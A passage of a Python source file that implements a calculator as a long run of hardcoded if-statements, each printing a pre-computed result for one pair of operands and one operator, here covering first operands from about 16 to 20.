print('16 - 24 = -8')\nif num_1 == 16 and num_2 == 24 and calc == '*': print('16 * 24 = 384')\nif num_1 == 16 and num_2 == 24 and calc == '/': print('16 / 24 = 0.6666666666666666')\nif num_1 == 17 and num_2 == 0 and calc == '+': print('17 + 0 = 17')\nif num_1 == 17 and num_2 == 0 and calc == '-': print('17 - 0 = 17')\nif num_1 == 17 and num_2 == 0 and calc == '*': print('17 * 0 = 0')\nif num_1 == 17 and num_2 == 0 and calc == '/': print('17 / 0 = Cannot divide by zero!')\nif num_1 == 17 and num_2 == 1 and calc == '+': print('17 + 1 = 18')\nif num_1 == 17 and num_2 == 1 and calc == '-': print('17 - 1 = 16')\nif num_1 == 17 and num_2 == 1 and calc == '*': print('17 * 1 = 17')\nif num_1 == 17 and num_2 == 1 and calc == '/': print('17 / 1 = 17.0')\nif num_1 == 17 and num_2 == 2 and calc == '+': print('17 + 2 = 19')\nif num_1 == 17 and num_2 == 2 and calc == '-': print('17 - 2 = 15')\nif num_1 == 17 and num_2 == 2 and calc == '*': print('17 * 2 = 34')\nif num_1 == 17 and num_2 == 2 and calc == '/': print('17 / 2 = 8.5')\nif num_1 == 17 and num_2 == 3 and calc == '+': print('17 + 3 = 20')\nif num_1 == 17 and num_2 == 3 and calc == '-': print('17 - 3 = 14')\nif num_1 == 17 and num_2 == 3 and calc == '*': print('17 * 3 = 51')\nif num_1 == 17 and num_2 == 3 and calc == '/': print('17 / 3 = 5.666666666666667')\nif num_1 == 17 and num_2 == 4 and calc == '+': print('17 + 4 = 21')\nif num_1 == 17 and num_2 == 4 and calc == '-': print('17 - 4 = 13')\nif num_1 == 17 and num_2 == 4 and calc == '*': print('17 * 4 = 68')\nif num_1 == 17 and num_2 == 4 and calc == '/': print('17 / 4 = 4.25')\nif num_1 == 17 and num_2 == 5 and calc == '+': print('17 + 5 = 22')\nif num_1 == 17 and num_2 == 5 and calc == '-': print('17 - 5 = 12')\nif num_1 == 17 and num_2 == 5 and calc == '*': print('17 * 5 = 85')\nif num_1 == 17 and num_2 == 5 and calc == '/': print('17 / 5 = 3.4')\nif num_1 == 17 and num_2 == 6 and calc == '+': print('17 + 6 = 23')\nif num_1 == 17 and num_2 == 6 and calc == '-': print('17 - 6 = 11')\nif num_1 == 17 and num_2 == 6 and calc == '*': print('17 * 6 = 102')\nif num_1 == 17 and num_2 == 6 and calc == '/': print('17 / 6 = 2.8333333333333335')\nif num_1 == 17 and num_2 == 7 and calc == '+': print('17 + 7 = 24')\nif num_1 == 17 and num_2 == 7 and calc == '-': print('17 - 7 = 10')\nif num_1 == 17 and num_2 == 7 and calc == '*': print('17 * 7 = 119')\nif num_1 == 17 and num_2 == 7 and calc == '/': print('17 / 7 = 2.4285714285714284')\nif num_1 == 17 and num_2 == 8 and calc == '+': print('17 + 8 = 25')\nif num_1 == 17 and num_2 == 8 and calc == '-': print('17 - 8 = 9')\nif num_1 == 17 and num_2 == 8 and calc == '*': print('17 * 8 = 136')\nif num_1 == 17 and num_2 == 8 and calc == '/': print('17 / 8 = 2.125')\nif num_1 == 17 and num_2 == 9 and calc == '+': print('17 + 9 = 26')\nif num_1 == 17 and num_2 == 9 and calc == '-': print('17 - 9 = 8')\nif num_1 == 17 and num_2 == 9 and calc == '*': print('17 * 9 = 153')\nif num_1 == 17 and num_2 == 9 and calc == '/': print('17 / 9 = 1.8888888888888888')\nif num_1 == 17 and num_2 == 10 and calc == '+': print('17 + 10 = 27')\nif num_1 == 17 and num_2 == 10 and calc == '-': print('17 - 10 = 7')\nif num_1 == 17 and num_2 == 10 and calc == '*': print('17 * 10 = 170')\nif num_1 == 17 and num_2 == 10 and calc == '/': print('17 / 10 = 1.7')\nif num_1 == 17 and num_2 == 11 and calc == '+': print('17 + 11 = 28')\nif num_1 == 17 and num_2 == 11 and calc == '-': print('17 - 11 = 6')\nif num_1 == 17 and num_2 == 11 and calc == '*': print('17 * 11 = 187')\nif num_1 == 17 and num_2 == 11 and calc == '/': print('17 / 11 = 1.5454545454545454')\nif num_1 == 17 and num_2 == 12 and calc == '+': print('17 + 12 = 29')\nif num_1 == 17 and num_2 == 12 and calc == '-': print('17 - 12 = 5')\nif num_1 == 17 and num_2 == 12 and calc == '*': print('17 * 12 = 204')\nif num_1 == 17 and num_2 == 12 and calc == '/': print('17 / 12 = 1.4166666666666667')\nif num_1 == 17 and num_2 == 13 and calc == '+': print('17 + 13 = 30')\nif num_1 == 17 and num_2 == 13 and calc == '-': print('17 - 13 = 4')\nif num_1 == 17 and num_2 == 13 and calc == '*': print('17 * 13 = 221')\nif num_1 == 17 and num_2 == 13 and calc == '/': print('17 / 13 = 1.3076923076923077')\nif num_1 == 17 and num_2 == 14 and calc == '+': print('17 + 14 = 31')\nif num_1 == 17 and num_2 == 14 and calc == '-': print('17 - 14 = 3')\nif num_1 == 17 and num_2 == 14 and calc == '*': print('17 * 14 = 238')\nif num_1 == 17 and num_2 == 14 and calc == '/': print('17 / 14 = 1.2142857142857142')\nif num_1 == 17 and num_2 == 15 and calc == '+': print('17 + 15 = 32')\nif num_1 == 17 and num_2 == 15 and calc == '-': print('17 - 15 = 2')\nif num_1 == 17 and num_2 == 15 and calc == '*': print('17 * 15 = 255')\nif num_1 == 17 and num_2 == 15 and calc == '/': print('17 / 15 = 1.1333333333333333')\nif num_1 == 17 and num_2 == 16 and calc == '+': print('17 + 16 = 33')\nif num_1 == 17 and num_2 == 16 and calc == '-': print('17 - 16 = 1')\nif num_1 == 17 and num_2 == 16 and calc == '*': print('17 * 16 = 272')\nif num_1 == 17 and num_2 == 16 and calc == '/': print('17 / 16 = 1.0625')\nif num_1 == 17 and num_2 == 17 and calc == '+': print('17 + 17 = 34')\nif num_1 == 17 and num_2 == 17 and calc == '-': print('17 - 17 = 0')\nif num_1 == 17 and num_2 == 17 and calc == '*': print('17 * 17 = 289')\nif num_1 == 17 and num_2 == 17 and calc == '/': print('17 / 17 = 1.0')\nif num_1 == 17 and num_2 == 18 and calc == '+': print('17 + 18 = 35')\nif num_1 == 17 and num_2 == 18 and calc == '-': print('17 - 18 = -1')\nif num_1 == 17 and num_2 == 18 and calc == '*': print('17 * 18 = 306')\nif num_1 == 17 and num_2 == 18 and calc == '/': print('17 / 18 = 0.9444444444444444')\nif num_1 == 17 and num_2 == 19 and calc == '+': print('17 + 19 = 36')\nif num_1 == 17 and num_2 == 19 and calc == '-': print('17 - 19 = -2')\nif num_1 == 17 and num_2 == 19 and calc == '*': print('17 * 19 = 323')\nif num_1 == 17 and num_2 == 19 and calc == '/': print('17 / 19 = 0.8947368421052632')\nif num_1 == 17 and num_2 == 20 and calc == '+': print('17 + 20 = 37')\nif num_1 == 17 and num_2 == 20 and calc == '-': print('17 - 20 = -3')\nif num_1 == 17 and num_2 == 20 and calc == '*': print('17 * 20 = 340')\nif num_1 == 17 and num_2 == 20 and calc == '/': print('17 / 20 = 0.85')\nif num_1 == 17 and num_2 == 21 and calc == '+': print('17 + 21 = 38')\nif num_1 == 17 and num_2 == 21 and calc == '-': print('17 - 21 = -4')\nif num_1 == 17 and num_2 == 21 and calc == '*': print('17 * 21 = 357')\nif num_1 == 17 and num_2 == 21 and calc == '/': print('17 / 21 = 0.8095238095238095')\nif num_1 == 17 and num_2 == 22 and calc == '+': print('17 + 22 = 39')\nif num_1 == 17 and num_2 == 22 and calc == '-': print('17 - 22 = -5')\nif num_1 == 17 and num_2 == 22 and calc == '*': print('17 * 22 = 374')\nif num_1 == 17 and num_2 == 22 and calc == '/': print('17 / 22 = 0.7727272727272727')\nif num_1 == 17 and num_2 == 23 and calc == '+': print('17 + 23 = 40')\nif num_1 == 17 and num_2 == 23 and calc == '-': print('17 - 23 = -6')\nif num_1 == 17 and num_2 == 23 and calc == '*': print('17 * 23 = 391')\nif num_1 == 17 and num_2 == 23 and calc == '/': print('17 / 23 = 0.7391304347826086')\nif num_1 == 17 and num_2 == 24 and calc == '+': print('17 + 24 = 41')\nif num_1 == 17 and num_2 == 24 and calc == '-': print('17 - 24 = -7')\nif num_1 == 17 and num_2 == 24 and calc == '*': print('17 * 24 = 408')\nif num_1 == 17 and num_2 == 24 and calc == '/': print('17 / 24 = 0.7083333333333334')\nif num_1 == 18 and num_2 == 0 and calc == '+': print('18 + 0 = 18')\nif num_1 == 18 and num_2 == 0 and calc == '-': print('18 - 0 = 18')\nif num_1 == 18 and num_2 == 0 and calc == '*': print('18 * 0 = 0')\nif num_1 == 18 and num_2 == 0 and calc == '/': print('18 / 0 = Cannot divide by zero!')\nif num_1 == 18 and num_2 == 1 and calc == '+': print('18 + 1 = 19')\nif num_1 == 18 and num_2 == 1 and calc == '-': print('18 - 1 = 17')\nif num_1 == 18 and num_2 == 1 and calc == '*': print('18 * 1 = 18')\nif num_1 == 18 and num_2 == 1 and calc == '/': print('18 / 1 = 18.0')\nif num_1 == 18 and num_2 == 2 and calc == '+': print('18 + 2 = 20')\nif num_1 == 18 and num_2 == 2 and calc == '-': print('18 - 2 = 16')\nif num_1 == 18 and num_2 == 2 and calc == '*': print('18 * 2 = 36')\nif num_1 == 18 and num_2 == 2 and calc == '/': print('18 / 2 = 9.0')\nif num_1 == 18 and num_2 == 3 and calc == '+': print('18 + 3 = 21')\nif num_1 == 18 and num_2 == 3 and calc == '-': print('18 - 3 = 15')\nif num_1 == 18 and num_2 == 3 and calc == '*': print('18 * 3 = 54')\nif num_1 == 18 and num_2 == 3 and calc == '/': print('18 / 3 = 6.0')\nif num_1 == 18 and num_2 == 4 and calc == '+': print('18 + 4 = 22')\nif num_1 == 18 and num_2 == 4 and calc == '-': print('18 - 4 = 14')\nif num_1 == 18 and num_2 == 4 and calc == '*': print('18 * 4 = 72')\nif num_1 == 18 and num_2 == 4 and calc == '/': print('18 / 4 = 4.5')\nif num_1 == 18 and num_2 == 5 and calc == '+': print('18 + 5 = 23')\nif num_1 == 18 and num_2 == 5 and calc == '-': print('18 - 5 = 13')\nif num_1 == 18 and num_2 == 5 and calc == '*': print('18 * 5 = 90')\nif num_1 == 18 and num_2 == 5 and calc == '/': print('18 / 5 = 3.6')\nif num_1 == 18 and num_2 == 6 and calc == '+': print('18 + 6 = 24')\nif num_1 == 18 and num_2 == 6 and calc == '-': print('18 - 6 = 12')\nif num_1 == 18 and num_2 == 6 and calc == '*': print('18 * 6 = 108')\nif num_1 == 18 and num_2 == 6 and calc == '/': print('18 / 6 = 3.0')\nif num_1 == 18 and num_2 == 7 and calc == '+': print('18 + 7 = 25')\nif num_1 == 18 and num_2 == 7 and calc == '-': print('18 - 7 = 11')\nif num_1 == 18 and num_2 == 7 and calc == '*': print('18 * 7 = 126')\nif num_1 == 18 and num_2 == 7 and calc == '/': print('18 / 7 = 2.5714285714285716')\nif num_1 == 18 and num_2 == 8 and calc == '+': print('18 + 8 = 26')\nif num_1 == 18 and num_2 == 8 and calc == '-': print('18 - 8 = 10')\nif num_1 == 18 and num_2 == 8 and calc == '*': print('18 * 8 = 144')\nif num_1 == 18 and num_2 == 8 and calc == '/': print('18 / 8 = 2.25')\nif num_1 == 18 and num_2 == 9 and calc == '+': print('18 + 9 = 27')\nif num_1 == 18 and num_2 == 9 and calc == '-': print('18 - 9 = 9')\nif num_1 == 18 and num_2 == 9 and calc == '*': print('18 * 9 = 162')\nif num_1 == 18 and num_2 == 9 and calc == '/': print('18 / 9 = 2.0')\nif num_1 == 18 and num_2 == 10 and calc == '+': print('18 + 10 = 28')\nif num_1 == 18 and num_2 == 10 and calc == '-': print('18 - 10 = 8')\nif num_1 == 18 and num_2 == 10 and calc == '*': print('18 * 10 = 180')\nif num_1 == 18 and num_2 == 10 and calc == '/': print('18 / 10 = 1.8')\nif num_1 == 18 and num_2 == 11 and calc == '+': print('18 + 11 = 29')\nif num_1 == 18 and num_2 == 11 and calc == '-': print('18 - 11 = 7')\nif num_1 == 18 and num_2 == 11 and calc == '*': print('18 * 11 = 198')\nif num_1 == 18 and num_2 == 11 and calc == '/': print('18 / 11 = 1.6363636363636365')\nif num_1 == 18 and num_2 == 12 and calc == '+': print('18 + 12 = 30')\nif num_1 == 18 and num_2 == 12 and calc == '-': print('18 - 12 = 6')\nif num_1 == 18 and num_2 == 12 and calc == '*': print('18 * 12 = 216')\nif num_1 == 18 and num_2 == 12 and calc == '/': print('18 / 12 = 1.5')\nif num_1 == 18 and num_2 == 13 and calc == '+': print('18 + 13 = 31')\nif num_1 == 18 and num_2 == 13 and calc == '-': print('18 - 13 = 5')\nif num_1 == 18 and num_2 == 13 and calc == '*': print('18 * 13 = 234')\nif num_1 == 18 and num_2 == 13 and calc == '/': print('18 / 13 = 1.3846153846153846')\nif num_1 == 18 and num_2 == 14 and calc == '+': print('18 + 14 = 32')\nif num_1 == 18 and num_2 == 14 and calc == '-': print('18 - 14 = 4')\nif num_1 == 18 and num_2 == 14 and calc == '*': print('18 * 14 = 252')\nif num_1 == 18 and num_2 == 14 and calc == '/': print('18 / 14 = 1.2857142857142858')\nif num_1 == 18 and num_2 == 15 and calc == '+': print('18 + 15 = 33')\nif num_1 == 18 and num_2 == 15 and calc == '-': print('18 - 15 = 3')\nif num_1 == 18 and num_2 == 15 and calc == '*': print('18 * 15 = 270')\nif num_1 == 18 and num_2 == 15 and calc == '/': print('18 / 15 = 1.2')\nif num_1 == 18 and num_2 == 16 and calc == '+': print('18 + 16 = 34')\nif num_1 == 18 and num_2 == 16 and calc == '-': print('18 - 16 = 2')\nif num_1 == 18 and num_2 == 16 and calc == '*': print('18 * 16 = 288')\nif num_1 == 18 and num_2 == 16 and calc == '/': print('18 / 16 = 1.125')\nif num_1 == 18 and num_2 == 17 and calc == '+': print('18 + 17 = 35')\nif num_1 == 18 and num_2 == 17 and calc == '-': print('18 - 17 = 1')\nif num_1 == 18 and num_2 == 17 and calc == '*': print('18 * 17 = 306')\nif num_1 == 18 and num_2 == 17 and calc == '/': print('18 / 17 = 1.0588235294117647')\nif num_1 == 18 and num_2 == 18 and calc == '+': print('18 + 18 = 36')\nif num_1 == 18 and num_2 == 18 and calc == '-': print('18 - 18 = 0')\nif num_1 == 18 and num_2 == 18 and calc == '*': print('18 * 18 = 324')\nif num_1 == 18 and num_2 == 18 and calc == '/': print('18 / 18 = 1.0')\nif num_1 == 18 and num_2 == 19 and calc == '+': print('18 + 19 = 37')\nif num_1 == 18 and num_2 == 19 and calc == '-': print('18 - 19 = -1')\nif num_1 == 18 and num_2 == 19 and calc == '*': print('18 * 19 = 342')\nif num_1 == 18 and num_2 == 19 and calc == '/': print('18 / 19 = 0.9473684210526315')\nif num_1 == 18 and num_2 == 20 and calc == '+': print('18 + 20 = 38')\nif num_1 == 18 and num_2 == 20 and calc == '-': print('18 - 20 = -2')\nif num_1 == 18 and num_2 == 20 and calc == '*': print('18 * 20 = 360')\nif num_1 == 18 and num_2 == 20 and calc == '/': print('18 / 20 = 0.9')\nif num_1 == 18 and num_2 == 21 and calc == '+': print('18 + 21 = 39')\nif num_1 == 18 and num_2 == 21 and calc == '-': print('18 - 21 = -3')\nif num_1 == 18 and num_2 == 21 and calc == '*': print('18 * 21 = 378')\nif num_1 == 18 and num_2 == 21 and calc == '/': print('18 / 21 = 0.8571428571428571')\nif num_1 == 18 and num_2 == 22 and calc == '+': print('18 + 22 = 40')\nif num_1 == 18 and num_2 == 22 and calc == '-': print('18 - 22 = -4')\nif num_1 == 18 and num_2 == 22 and calc == '*': print('18 * 22 = 396')\nif num_1 == 18 and num_2 == 22 and calc == '/': print('18 / 22 = 0.8181818181818182')\nif num_1 == 18 and num_2 == 23 and calc == '+': print('18 + 23 = 41')\nif num_1 == 18 and num_2 == 23 and calc == '-': print('18 - 23 = -5')\nif num_1 == 18 and num_2 == 23 and calc == '*': print('18 * 23 = 414')\nif num_1 == 18 and num_2 == 23 and calc == '/': print('18 / 23 = 0.782608695652174')\nif num_1 == 18 and num_2 == 24 and calc == '+': print('18 + 24 = 42')\nif num_1 == 18 and num_2 == 24 and calc == '-': print('18 - 24 = -6')\nif num_1 == 18 and num_2 == 24 and calc == '*': print('18 * 24 = 432')\nif num_1 == 18 and num_2 == 24 and calc == '/': print('18 / 24 = 0.75')\nif num_1 == 19 and num_2 == 0 and calc == '+': print('19 + 0 = 19')\nif num_1 == 19 and num_2 == 0 and calc == '-': print('19 - 0 = 19')\nif num_1 == 19 and num_2 == 0 and calc == '*': print('19 * 0 = 0')\nif num_1 == 19 and num_2 == 0 and calc == '/': print('19 / 0 = Cannot divide by zero!')\nif num_1 == 19 and num_2 == 1 and calc == '+': print('19 + 1 = 20')\nif num_1 == 19 and num_2 == 1 and calc == '-': print('19 - 1 = 18')\nif num_1 == 19 and num_2 == 1 and calc == '*': print('19 * 1 = 19')\nif num_1 == 19 and num_2 == 1 and calc == '/': print('19 / 1 = 19.0')\nif num_1 == 19 and num_2 == 2 and calc == '+': print('19 + 2 = 21')\nif num_1 == 19 and num_2 == 2 and calc == '-': print('19 - 2 = 17')\nif num_1 == 19 and num_2 == 2 and calc == '*': print('19 * 2 = 38')\nif num_1 == 19 and num_2 == 2 and calc == '/': print('19 / 2 = 9.5')\nif num_1 == 19 and num_2 == 3 and calc == '+': print('19 + 3 = 22')\nif num_1 == 19 and num_2 == 3 and calc == '-': print('19 - 3 = 16')\nif num_1 == 19 and num_2 == 3 and calc == '*': print('19 * 3 = 57')\nif num_1 == 19 and num_2 == 3 and calc == '/': print('19 / 3 = 6.333333333333333')\nif num_1 == 19 and num_2 == 4 and calc == '+': print('19 + 4 = 23')\nif num_1 == 19 and num_2 == 4 and calc == '-': print('19 - 4 = 15')\nif num_1 == 19 and num_2 == 4 and calc == '*': print('19 * 4 = 76')\nif num_1 == 19 and num_2 == 4 and calc == '/': print('19 / 4 = 4.75')\nif num_1 == 19 and num_2 == 5 and calc == '+': print('19 + 5 = 24')\nif num_1 == 19 and num_2 == 5 and calc == '-': print('19 - 5 = 14')\nif num_1 == 19 and num_2 == 5 and calc == '*': print('19 * 5 = 95')\nif num_1 == 19 and num_2 == 5 and calc == '/': print('19 / 5 = 3.8')\nif num_1 == 19 and num_2 == 6 and calc == '+': print('19 + 6 = 25')\nif num_1 == 19 and num_2 == 6 and calc == '-': print('19 - 6 = 13')\nif num_1 == 19 and num_2 == 6 and calc == '*': print('19 * 6 = 114')\nif num_1 == 19 and num_2 == 6 and calc == '/': print('19 / 6 = 3.1666666666666665')\nif num_1 == 19 and num_2 == 7 and calc == '+': print('19 + 7 = 26')\nif num_1 == 19 and num_2 == 7 and calc == '-': print('19 - 7 = 12')\nif num_1 == 19 and num_2 == 7 and calc == '*': print('19 * 7 = 133')\nif num_1 == 19 and num_2 == 7 and calc == '/': print('19 / 7 = 2.7142857142857144')\nif num_1 == 19 and num_2 == 8 and calc == '+': print('19 + 8 = 27')\nif num_1 == 19 and num_2 == 8 and calc == '-': print('19 - 8 = 11')\nif num_1 == 19 and num_2 == 8 and calc == '*': print('19 * 8 = 152')\nif num_1 == 19 and num_2 == 8 and calc == '/': print('19 / 8 = 2.375')\nif num_1 == 19 and num_2 == 9 and calc == '+': print('19 + 9 = 28')\nif num_1 == 19 and num_2 == 9 and calc == '-': print('19 - 9 = 10')\nif num_1 == 19 and num_2 == 9 and calc == '*': print('19 * 9 = 171')\nif num_1 == 19 and num_2 == 9 and calc == '/': print('19 / 9 = 2.111111111111111')\nif num_1 == 19 and num_2 == 10 and calc == '+': print('19 + 10 = 29')\nif num_1 == 19 and num_2 == 10 and calc == '-': print('19 - 10 = 9')\nif num_1 == 19 and num_2 == 10 and calc == '*': print('19 * 10 = 190')\nif num_1 == 19 and num_2 == 10 and calc == '/': print('19 / 10 = 1.9')\nif num_1 == 19 and num_2 == 11 and calc == '+': print('19 + 11 = 30')\nif num_1 == 19 and num_2 == 11 and calc == '-': print('19 - 11 = 8')\nif num_1 == 19 and num_2 == 11 and calc == '*': print('19 * 11 = 209')\nif num_1 == 19 and num_2 == 11 and calc == '/': print('19 / 11 = 1.7272727272727273')\nif num_1 == 19 and num_2 == 12 and calc == '+': print('19 + 12 = 31')\nif num_1 == 19 and num_2 == 12 and calc == '-': print('19 - 12 = 7')\nif num_1 == 19 and num_2 == 12 and calc == '*': print('19 * 12 = 228')\nif num_1 == 19 and num_2 == 12 and calc == '/': print('19 / 12 = 1.5833333333333333')\nif num_1 == 19 and num_2 == 13 and calc == '+': print('19 + 13 = 32')\nif num_1 == 19 and num_2 == 13 and calc == '-': print('19 - 13 = 6')\nif num_1 == 19 and num_2 == 13 and calc == '*': print('19 * 13 = 247')\nif num_1 == 19 and num_2 == 13 and calc == '/': print('19 / 13 = 1.4615384615384615')\nif num_1 == 19 and num_2 == 14 and calc == '+': print('19 + 14 = 33')\nif num_1 == 19 and num_2 == 14 and calc == '-': print('19 - 14 = 5')\nif num_1 == 19 and num_2 == 14 and calc == '*': print('19 * 14 = 266')\nif num_1 == 19 and num_2 == 14 and calc == '/': print('19 / 14 = 1.3571428571428572')\nif num_1 == 19 and num_2 == 15 and calc == '+': print('19 + 15 = 34')\nif num_1 == 19 and num_2 == 15 and calc == '-': print('19 - 15 = 4')\nif num_1 == 19 and num_2 == 15 and calc == '*': print('19 * 15 = 285')\nif num_1 == 19 and num_2 == 15 and calc == '/': print('19 / 15 = 1.2666666666666666')\nif num_1 == 19 and num_2 == 16 and calc == '+': print('19 + 16 = 35')\nif num_1 == 19 and num_2 == 16 and calc == '-': print('19 - 16 = 3')\nif num_1 == 19 and num_2 == 16 and calc == '*': print('19 * 16 = 304')\nif num_1 == 19 and num_2 == 16 and calc == '/': print('19 / 16 = 1.1875')\nif num_1 == 19 and num_2 == 17 and calc == '+': print('19 + 17 = 36')\nif num_1 == 19 and num_2 == 17 and calc == '-': print('19 - 17 = 2')\nif num_1 == 19 and num_2 == 17 and calc == '*': print('19 * 17 = 323')\nif num_1 == 19 and num_2 == 17 and calc == '/': print('19 / 17 = 1.1176470588235294')\nif num_1 == 19 and num_2 == 18 and calc == '+': print('19 + 18 = 37')\nif num_1 == 19 and num_2 == 18 and calc == '-': print('19 - 18 = 1')\nif num_1 == 19 and num_2 == 18 and calc == '*': print('19 * 18 = 342')\nif num_1 == 19 and num_2 == 18 and calc == '/': print('19 / 18 = 1.0555555555555556')\nif num_1 == 19 and num_2 == 19 and calc == '+': print('19 + 19 = 38')\nif num_1 == 19 and num_2 == 19 and calc == '-': print('19 - 19 = 0')\nif num_1 == 19 and num_2 == 19 and calc == '*': print('19 * 19 = 361')\nif num_1 == 19 and num_2 == 19 and calc == '/': print('19 / 19 = 1.0')\nif num_1 == 19 and num_2 == 20 and calc == '+': print('19 + 20 = 39')\nif num_1 == 19 and num_2 == 20 and calc == '-': print('19 - 20 = -1')\nif num_1 == 19 and num_2 == 20 and calc == '*': print('19 * 20 = 380')\nif num_1 == 19 and num_2 == 20 and calc == '/': print('19 / 20 = 0.95')\nif num_1 == 19 and num_2 == 21 and calc == '+': print('19 + 21 = 40')\nif num_1 == 19 and num_2 == 21 and calc == '-': print('19 - 21 = -2')\nif num_1 == 19 and num_2 == 21 and calc == '*': print('19 * 21 = 399')\nif num_1 == 19 and num_2 == 21 and calc == '/': print('19 / 21 = 0.9047619047619048')\nif num_1 == 19 and num_2 == 22 and calc == '+': print('19 + 22 = 41')\nif num_1 == 19 and num_2 == 22 and calc == '-': print('19 - 22 = -3')\nif num_1 == 19 and num_2 == 22 and calc == '*': print('19 * 22 = 418')\nif num_1 == 19 and num_2 == 22 and calc == '/': print('19 / 22 = 0.8636363636363636')\nif num_1 == 19 and num_2 == 23 and calc == '+': print('19 + 23 = 42')\nif num_1 == 19 and num_2 == 23 and calc == '-': print('19 - 23 = -4')\nif num_1 == 19 and num_2 == 23 and calc == '*': print('19 * 23 = 437')\nif num_1 == 19 and num_2 == 23 and calc == '/': print('19 / 23 = 0.8260869565217391')\nif num_1 == 19 and num_2 == 24 and calc == '+': print('19 + 24 = 43')\nif num_1 == 19 and num_2 == 24 and calc == '-': print('19 - 24 = -5')\nif num_1 == 19 and num_2 == 24 and calc == '*': print('19 * 24 = 456')\nif num_1 == 19 and num_2 == 24 and calc == '/': print('19 / 24 = 0.7916666666666666')\nif num_1 == 20 and num_2 == 0 and calc == '+': print('20 + 0 = 20')\nif num_1 == 20 and num_2 == 0 and calc == '-': print('20 - 0 = 20')\nif num_1 == 20 and num_2 == 0 and calc == '*': print('20 * 0 = 0')\nif num_1 == 20 and num_2 == 0 and calc == '/': print('20 / 0 = Cannot divide by zero!')\nif num_1 == 20 and num_2 == 1 and calc == '+': print('20 + 1 = 21')\nif num_1 == 20 and num_2 == 1 and calc == '-': print('20 - 1 = 19')\nif num_1 == 20 and num_2 == 1 and calc == '*': print('20 * 1 = 20')\nif num_1 == 20 and num_2 == 1 and calc == '/': print('20 / 1 = 20.0')\nif num_1 == 20 and num_2 == 2 and calc == '+': print('20 + 2 = 22')\nif num_1 == 20 and num_2 == 2 and calc == '-': print('20 - 2 = 18')\nif num_1 == 20 and num_2 == 2 and calc == '*': print('20 * 2 = 40')\nif num_1 == 20 and num_2 == 2 and calc == '/': print('20 / 2 = 10.0')\nif num_1 == 20 and num_2 == 3 and calc == '+': print('20 + 3 = 23')\nif num_1 == 20 and num_2 == 3 and calc == '-': print('20 - 3 = 17')\nif num_1 == 20 and num_2 == 3 and calc == '*': print('20 * 3 = 60')\nif num_1 == 20 and num_2 == 3 and calc == '/': print('20 / 3 = 6.666666666666667')\nif num_1 == 20 and num_2 == 4 and calc == '+': print('20 + 4 = 24')\nif num_1 == 20 and num_2 == 4 and calc == '-': print('20 - 4 = 16')\nif num_1 == 20 and num_2 == 4 and calc == '*': print('20 * 4 = 80')\nif num_1 == 20 and num_2 == 4 and calc == '/': print('20 / 4 = 5.0')\nif num_1 == 20 and num_2 == 5 and calc == '+': print('20 + 5 = 25')\nif num_1 == 20 and num_2 == 5 and calc == '-': print('20 - 5 = 15')\nif num_1 == 20 and num_2 == 5 and calc == '*': print('20 * 5 = 100')\nif num_1 == 20 and num_2 == 5 and calc == '/': print('20 / 5 = 4.0')\nif num_1 == 20 and num_2 == 6 and calc == '+': print('20 + 6 = 26')\nif num_1 == 20 and num_2 == 6 and calc == '-': print('20 - 6 = 14')\nif num_1 == 20 and num_2 == 6 and calc == '*': print('20 * 6 = 120')\nif num_1 == 20 and num_2 == 6 and calc == '/': print('20 / 6 = 3.3333333333333335')\nif num_1 == 20 and num_2 == 7 and calc == '+': print('20 + 7 = 27')\nif num_1 == 20 and num_2 == 7 and calc == '-': print('20 - 7 = 13')\nif num_1 == 20 and num_2 == 7 and calc == '*': print('20 * 7 = 140')\nif num_1 == 20 and num_2 == 7 and calc == '/': print('20 / 7 = 2.857142857142857')\nif num_1 == 20 and num_2 == 8 and calc == '+': print('20 + 8 = 28')\nif num_1 == 20 and num_2 == 8 and calc == '-': print('20 - 8 = 12')\nif num_1 == 20 and num_2 == 8 and calc == '*': print('20 * 8 = 160')\nif num_1 == 20 and num_2 == 8 and calc == '/': print('20 / 8 = 2.5')\nif num_1 == 20 and num_2 == 9 and calc == '+': print('20 + 9 = 29')\nif num_1 == 20 and num_2 == 9 and calc == '-': print('20 - 9 = 11')\nif num_1 == 20 and num_2 == 9 and calc == '*': print('20 * 9 = 180')\nif num_1 == 20 and num_2 == 9 and calc == '/': print('20 / 9 = 2.2222222222222223')\nif num_1 == 20 and num_2 == 10 and calc == '+': print('20 + 10 = 30')\nif num_1 == 20 and num_2 == 10 and calc == '-': print('20 - 10 = 10')\nif num_1 == 20 and num_2 == 10 and calc == '*': print('20 * 10 = 200')\nif num_1 == 20 and num_2 == 10 and calc == '/': print('20 / 10 = 2.0')\nif num_1 == 20 and num_2 == 11 and calc == '+': print('20 + 11 = 31')\nif num_1 == 20 and num_2 == 11 and calc == '-': print('20 - 11 = 9')\nif num_1 == 20 and num_2 == 11 and calc == '*': print('20 * 11 = 220')\nif num_1 == 20 and num_2 == 11 and calc == '/': print('20 / 11 = 1.8181818181818181')\nif num_1 == 20 and num_2 == 12 and calc == '+': print('20 + 12 = 32')\nif num_1 == 20 and num_2 == 12 and calc == '-': print('20 - 12 = 8')\nif num_1 == 20 and num_2 == 12 and calc == '*': print('20 * 12 = 240')\nif num_1 == 20 and num_2 == 12 and calc == '/': print('20 / 12 = 1.6666666666666667')\nif num_1 == 20 and num_2 == 13 and calc == '+': print('20 + 13 = 33')\nif num_1 == 20 and num_2 == 13 and calc == '-': print('20 - 13 = 7')\nif num_1 == 20 and num_2 == 13 and calc == '*': print('20 * 13 = 260')\nif num_1 == 20 and num_2 == 13 and calc == '/': print('20 / 13 = 1.5384615384615385')\nif num_1 == 20 and num_2 == 14 and calc == '+': print('20 + 14 = 34')\nif num_1 == 20 and num_2 == 14 and calc == '-': print('20 - 14 = 6')\nif num_1 == 20 and num_2 == 14 and calc == '*': print('20 * 14 = 280')\nif num_1 == 20 and num_2 == 14 and calc == '/': print('20 / 14 = 1.4285714285714286')\nif num_1 == 20 and num_2 == 15 and calc == '+': print('20 + 15 = 35')\nif num_1 == 20 and num_2 == 15 and calc == '-': print('20 - 15 = 5')\nif num_1 == 20 and num_2 == 15 and calc == '*': print('20 * 15 = 300')\nif num_1 == 20 and num_2 == 15 and calc == '/': print('20 / 15 = 1.3333333333333333')\nif num_1 == 20 and num_2 == 16 and calc == '+': print('20 + 16 = 36')\nif num_1 == 20 and num_2 == 16 and calc == '-': print('20 - 16 = 4')\nif num_1 == 20 and num_2 == 16 and calc == '*': print('20 * 16 = 320')\nif num_1 == 20 and num_2 == 16 and calc == '/': print('20 / 16 = 1.25')\nif num_1 == 20 and num_2 == 17 and calc == '+': print('20 + 17 = 37')\nif num_1 == 20 and num_2 == 17 and calc == '-': print('20 - 17 = 3')\nif num_1 == 20 and num_2 == 17 and calc == '*': 